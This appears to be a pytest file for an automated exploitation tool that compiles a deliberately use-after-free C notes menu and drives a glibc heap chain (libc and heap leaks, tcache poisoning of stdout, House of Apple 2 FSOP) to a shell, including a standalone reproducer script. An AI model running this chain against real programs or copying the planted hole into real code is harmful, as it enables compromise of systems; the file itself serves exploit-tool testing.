"""Automated glibc-heap -> shell: tcache poisoning of _IO_2_1_stdout_ + House of Apple 2, driving a
menu-style heap target through libc leak (unsorted bin) + heap leak (tcache fd) + poison + FSOP."""
import glob
import shutil
import subprocess

import pytest

from lykos.analyze.poc import heap, leak

_SYS_LIBC = next(iter(glob.glob("/usr/lib/x86_64-linux-gnu/libc.so.6")
                      + glob.glob("/lib/x86_64-linux-gnu/libc.so.6")), None)


def test_unsorted_bin_offset_probe():
    """The calibration probe measures main_arena+0x60's offset for the running libc (page offset
    0xac8, a large full offset). Skips cleanly without a compiler / setarch."""
    off = heap.unsorted_bin_offset()
    if off is None:
        pytest.skip("no compiler/setarch to run the probe")
    assert off & 0xFFF == 0xAC8 and off > 0x100000        # main_arena+0x60, deep in libc's data


@pytest.fixture
def notes_bin(tmp_path_factory):
    from lykos.analyze.dynamic import sandbox
    if sandbox.host_arch() != "x86-64" or not _SYS_LIBC:
        pytest.skip("x86-64 + system libc required")
    gcc = shutil.which("gcc") or shutil.which("cc")
    if not gcc:
        pytest.skip("no C compiler")
    d = tmp_path_factory.mktemp("notes")
    (d / "v.c").write_text(
        '#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n'
        'char* n[32]; unsigned long sz[32];\n'
        'int rn(){int i; if(scanf("%d",&i)!=1)exit(0); return i;}\n'
        'unsigned long rz(){unsigned long z; if(scanf("%lu",&z)!=1)exit(0); return z;}\n'
        'int main(){ setvbuf(stdout,0,2,0); setvbuf(stdin,0,2,0);\n'
        ' while(1){ printf("> "); switch(rn()){\n'
        '  case 1:{int i=rn(); sz[i]=rz(); n[i]=malloc(sz[i]); read(0,n[i],sz[i]); break;}\n'
        '  case 2:{int i=rn(); free(n[i]); break;}\n'              # UAF: pointer not nulled
        '  case 3:{int i=rn(); write(1,n[i],sz[i]); break;}\n'     # view (leak)
        '  case 4:{int i=rn(); read(0,n[i],sz[i]); break;}\n'      # edit (UAF write)
        '  case 5: exit(0);} } }\n')
    exe = d / "v"
    if subprocess.run([gcc, "-no-pie", "-fno-stack-protector", "-w", str(d / "v.c"),
                       "-o", str(exe)], capture_output=True).returncode:
        pytest.skip("build failed")
    return exe


def test_heap_fsop_exploit_spawns_shell(notes_bin):
    """End-to-end on the host libc: a notes menu with a UAF is driven fully automatically to a real
    shell -- unsorted-bin libc leak, tcache-fd heap leak, tcache poison of _IO_2_1_stdout_, then the
    House-of-Apple-2 write + exit() flush."""
    off = heap.unsorted_bin_offset()
    if off is None:
        pytest.skip("no compiler/setarch to derive the arena offset")
    ld = open(_SYS_LIBC, "rb").read()

    def add(i, s, data):
        return f"1\n{i}\n{s}\n".encode() + data.ljust(1, b"A")

    res = leak.heap_fsop_exploit(
        notes_bin, notes_bin.parent, add=add, free=lambda i: f"2\n{i}\n".encode(),
        view=lambda i: f"3\n{i}\n".encode(), edit=lambda i, data: f"4\n{i}\n".encode() + data,
        exit_seq=b"5\n", libc_data=ld, unsorted_off=off, poison_size=0x300, guard_size=0x430,
        timeout=10.0)
    assert res["ok"], f"auto heap->shell failed: {res.get('reason')} (base={res.get('libc_base')})"
    assert res["libc_base"] % 0x1000 == 0


def test_heap_strategy_stage_confirms_l3(store, case, notes_bin):
    """The `heap` strategy wires the automated chain into build_exploit: a menu target with a UAF,
    run through the full stage, files a verified L3 (default op templates match the notes menu)."""
    from lykos.analyze import register
    from lykos.analyze.ingest import ingest, enqueue_triage
    from lykos.analyze.poc import enqueue_exploit
    from lykos.db.dao import PocDAO
    from lykos.jobs import JobConfig, JobQueue, WorkerPool
    if heap.unsorted_bin_offset() is None:
        pytest.skip("no compiler/setarch to derive the arena offset")
    register()
    pool = WorkerPool(store.db_path, store.content, JobConfig(workers=2, poll_interval=0.02))
    pool.start()
    try:
        t = ingest(store, case.id, notes_bin, filename="notes")
        q = JobQueue(store.conn)
        enqueue_triage(q, t, force=True); assert pool.wait_idle(40)
        run = enqueue_exploit(q, t, params={"input_mode": "stdin", "strategy": "heap"})
        assert pool.wait_idle(150) and q.runs.get(run.id).status == "done"
        assert any(pc.level == "L3" and pc.verified
                   for pc in PocDAO(store.conn).list_by_target(t.id))
    finally:
        pool.stop(grace=3.0)


@pytest.fixture
def menu_notes_bin(tmp_path_factory):
    """A notes heap menu that PRINTS a numbered menu (so the auto strategy recognises it as a heap
    challenge) using the canonical 1..5 = add/free/view/edit/exit convention with a UAF."""
    from lykos.analyze.dynamic import sandbox
    if sandbox.host_arch() != "x86-64" or not _SYS_LIBC:
        pytest.skip("x86-64 + system libc required")
    gcc = shutil.which("gcc") or shutil.which("cc")
    if not gcc:
        pytest.skip("no C compiler")
    d = tmp_path_factory.mktemp("menunotes")
    (d / "v.c").write_text(
        '#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n'
        'char* n[32]; unsigned long sz[32];\n'
        'int rn(){int i; if(scanf("%d",&i)!=1)exit(0); return i;}\n'
        'unsigned long rz(){unsigned long z; if(scanf("%lu",&z)!=1)exit(0); return z;}\n'
        'int main(){ setvbuf(stdout,0,2,0); setvbuf(stdin,0,2,0);\n'
        ' while(1){ printf("1. add\\n2. free\\n3. view\\n4. edit\\n5. exit\\n> ");\n'
        '  switch(rn()){\n'
        '  case 1:{int i=rn(); sz[i]=rz(); n[i]=malloc(sz[i]); read(0,n[i],sz[i]); break;}\n'
        '  case 2:{int i=rn(); free(n[i]); break;}\n'              # UAF: pointer not nulled
        '  case 3:{int i=rn(); write(1,n[i],sz[i]); break;}\n'     # view (leak)
        '  case 4:{int i=rn(); read(0,n[i],sz[i]); break;}\n'      # edit (UAF write)
        '  case 5: exit(0);} } }\n')
    exe = d / "v"
    if subprocess.run([gcc, "-no-pie", "-fno-stack-protector", "-w", str(d / "v.c"),
                       "-o", str(exe)], capture_output=True).returncode:
        pytest.skip("build failed")
    return exe


def test_heap_auto_strategy_is_push_button(store, case, menu_notes_bin):
    """The `auto` strategy (no analyst `strategy=heap`) now RECOGNISES a menu-driven heap target --
    a malloc/free pair plus a numbered menu -- and runs the tcache-poison + House-of-Apple-2 chain
    on its own, filing a verified L3. This is the push-button promotion of the previously
    analyst-gated heap finisher. The numbered-menu gate keeps it off non-heap auto targets."""
    from lykos.analyze import register
    from lykos.analyze.ingest import ingest, enqueue_triage
    from lykos.analyze.poc import enqueue_exploit
    from lykos.db.dao import PocDAO
    from lykos.jobs import JobConfig, JobQueue, WorkerPool
    if heap.unsorted_bin_offset() is None:
        pytest.skip("no compiler/setarch to derive the arena offset")
    register()
    pool = WorkerPool(store.db_path, store.content, JobConfig(workers=2, poll_interval=0.02))
    pool.start()
    try:
        t = ingest(store, case.id, menu_notes_bin, filename="menunotes")
        q = JobQueue(store.conn)
        enqueue_triage(q, t, force=True); assert pool.wait_idle(40)
        run = enqueue_exploit(q, t, params={"input_mode": "stdin", "strategy": "auto"})
        assert pool.wait_idle(150) and q.runs.get(run.id).status == "done"
        assert any(pc.level == "L3" and pc.verified
                   for pc in PocDAO(store.conn).list_by_target(t.id)), "auto did not reach heap L3"
    finally:
        pool.stop(grace=3.0)


def test_render_heap_script_reproduces_shell(notes_bin, tmp_path):
    """The bundled standalone reproducer (render_heap_script) re-drives the notes menu to a shell
    on its own -- no lykos imports -- proving the L3 bundle is self-reproducing."""
    import subprocess as sp
    off = heap.unsorted_bin_offset()
    if off is None:
        pytest.skip("no compiler/setarch to derive the arena offset")
    ld = open(_SYS_LIBC, "rb").read()
    T = heap.house_of_apple2_targets(ld)
    ops = {"add": "1\n{idx}\n{size}\n{data}", "free": "2\n{idx}\n", "view": "3\n{idx}\n",
           "edit": "4\n{idx}\n{data}", "exit_seq": "5\n"}
    script = leak.render_heap_script(menu_ops=ops, unsorted_off=off, stdout_off=T["stdout"],
                                     wfile_jumps_off=T["wfile_jumps"], system_off=T["system"])
    sf = tmp_path / "exploit.py"; sf.write_bytes(script)
    r = sp.run(["python3", str(sf), str(notes_bin)], capture_output=True, timeout=60)
    assert r.returncode == 0 and b"uid=" in r.stdout, (r.stdout[:200], r.stderr[:200])
